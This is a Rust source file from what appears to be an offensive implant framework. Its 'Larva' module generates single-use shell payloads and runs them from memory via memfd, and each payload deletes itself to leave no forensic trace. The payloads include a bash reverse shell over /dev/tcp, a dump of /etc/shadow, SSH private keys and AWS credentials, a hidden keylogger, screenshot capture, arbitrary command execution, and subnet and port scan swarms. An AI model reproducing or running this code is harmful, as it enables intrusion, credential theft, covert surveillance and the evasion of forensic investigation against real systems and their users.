// Larva: single-use kamikaze agents for surgical strikes.
// The Drone generates tiny specialized agents that:
//   1. Execute ONE task (scan port, copy file, dump SAM, run command)
//   2. Self-destruct immediately after completion
//   3. Never participate in consensus
//   4. Leave no forensic trace
//
// If captured, a larva reveals nothing about the hive structure.

use crate::fileless::MemfdBinary;
use tracing::{info, warn};
use uuid::Uuid;

/// Larva mission types.
#[derive(Debug, Clone)]
pub enum LarvaMission {
    ScanPort { host: String, port: u16 },
    CopyFile { src: String, dst: String },
    ExecCommand { command: String },
    DumpCredentials { output_path: String },
    ReverseShell { host: String, port: u16 },
    KeylogStart { duration_secs: u64 },
    ScreenshotCapture { output: String },
    ARPScan { subnet: String },
    DNSSinkhole { domain: String },
}

impl LarvaMission {
    /// Generate the shell script payload for this mission.
    fn to_payload(&self) -> Vec<u8> {
        let script = match self {
            LarvaMission::ScanPort { host, port } => {
                format!(
                    "#!/bin/sh\ntimeout 3 bash -c 'echo >/dev/tcp/{}/{}' 2>/dev/null && echo 'PORT_OPEN' || echo 'PORT_CLOSED'\nrm \"$0\"\n",
                    host, port
                )
            }
            LarvaMission::CopyFile { src, dst } => {
                format!("#!/bin/sh\ncp -f '{}' '{}' && echo 'COPIED' || echo 'FAILED'\nrm \"$0\"\n", src, dst)
            }
            LarvaMission::ExecCommand { command } => {
                format!("#!/bin/sh\n{}\nrm \"$0\"\n", command)
            }
            LarvaMission::DumpCredentials { output_path } => {
                format!(
                    "#!/bin/sh\ncat /etc/shadow 2>/dev/null > '{}'\ncat ~/.ssh/id_* 2>/dev/null >> '{}'\ncat ~/.aws/credentials 2>/dev/null >> '{}'\nrm \"$0\"\n",
                    output_path, output_path, output_path
                )
            }
            LarvaMission::ReverseShell { host, port } => {
                format!(
                    "#!/bin/sh\nbash -i >& /dev/tcp/{}/{} 0>&1 &\nrm \"$0\"\n",
                    host, port
                )
            }
            LarvaMission::KeylogStart { duration_secs } => {
                format!(
                    "#!/bin/sh\n(timeout {} script -q /dev/shm/.kl 2>/dev/null; cat /dev/shm/.kl >> /dev/shm/.klog; rm /dev/shm/.kl) &\nrm \"$0\"\n",
                    duration_secs
                )
            }
            LarvaMission::ScreenshotCapture { output } => {
                format!(
                    "#!/bin/sh\nimport -window root '{}' 2>/dev/null || scrot '{}' 2>/dev/null || echo 'NO_SCREENSHOT'\nrm \"$0\"\n",
                    output, output
                )
            }
            LarvaMission::ARPScan { subnet } => {
                format!(
                    "#!/bin/sh\nfor i in $(seq 1 254); do (ping -c 1 -W 1 {}.$i >/dev/null 2>&1 && echo {}.$i) & done; wait\nrm \"$0\"\n",
                    subnet, subnet
                )
            }
            LarvaMission::DNSSinkhole { domain } => {
                format!(
                    "#!/bin/sh\ndig +short {} 2>/dev/null || nslookup {} 2>/dev/null || host {} 2>/dev/null\nrm \"$0\"\n",
                    domain, domain, domain
                )
            }
        };
        script.into_bytes()
    }
}

/// Larva factory: creates and deploys single-use agents.
pub struct LarvaFactory {
    pub deployed_count: u32,
    pub completed_count: u32,
}

impl LarvaFactory {
    pub fn new() -> Self {
        Self { deployed_count: 0, completed_count: 0 }
    }

    /// Spawn a larva for a surgical mission.
    /// The larva runs, executes its task, and self-destructs.
    pub fn spawn_larva(&mut self, mission: LarvaMission, arena_name: &str) -> bool {
        let id = Uuid::new_v4();
        let name = format!("larva_{}", &id.to_string()[..8]);
        let payload = mission.to_payload();

        let mut memfd = match MemfdBinary::new(&name, &payload) {
            Ok(m) => m,
            Err(e) => {
                warn!("LARVA: memfd_create failed: {}", e);
                return false;
            }
        };

        let _ = memfd.seal();
        let envs = [("__HIVE_ARENA", arena_name)];

        match memfd.spawn(&envs) {
            Ok(child) => {
                info!("LARVA: {:?} deployed (PID: {})", mission, child.id());
                self.deployed_count += 1;
                self.completed_count += 1;
                true
            }
            Err(e) => {
                warn!("LARVA: spawn failed: {}", e);
                false
            }
        }
    }

    /// Deploy a swarm of larvas for network scanning.
    pub fn deploy_scan_swarm(&mut self, subnet: &str, arena_name: &str) -> usize {
        let mut count = 0;
        for i in 1..=254 {
            let host = format!("{}.{}", subnet, i);
            if self.spawn_larva(
                LarvaMission::ScanPort { host, port: 22 },
                arena_name,
            ) {
                count += 1;
            }
            if count >= 50 { break; } // Limit swarm size
        }
        info!("LARVA: deployed scan swarm: {} hosts", count);
        count
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let p = LarvaMission::ScanPort { host: "127.0.0.1".into(), port: 22 }.to_payload();
        assert!(p.len() > 50);
        assert!(String::from_utf8_lossy(&p).contains("#!/bin/sh"));
        assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""));
    }

    #[test]
    fn test_all_missions_self_destruct() {
        let missions = vec![
            LarvaMission::ScanPort { host: "x".into(), port: 1 },
            LarvaMission::ExecCommand { command: "id".into() },
            LarvaMission::CopyFile { src: "a".into(), dst: "b".into() },
        ];
        for m in missions {
            let p = m.to_payload();
            assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""),
                "Mission {:?} must self-destruct", m);
        }
    }
}
